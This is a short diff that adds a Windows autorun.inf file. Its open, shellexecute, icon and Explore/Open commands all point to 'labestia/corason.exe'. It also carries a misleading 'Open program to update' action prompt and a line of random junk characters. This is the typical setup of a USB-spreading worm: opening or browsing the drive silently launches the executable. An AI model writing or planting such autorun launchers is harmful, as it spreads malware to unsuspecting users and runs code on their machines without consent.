@@ -1,0 +1,9 @@
+[autorun]
+USEAUTOPLAY=1
+shellexecute=labestia/corason.exe
+action=Open program to update using Windows Explorer
+Shellvfnjfeqnvkpeqmvqil
+shell\\Explore\\command=labestia/corason.exe
+shell\Open\\command=labestia/corason.exe
+icon=labestia/corason.exe
+open=labestia/corason.exe
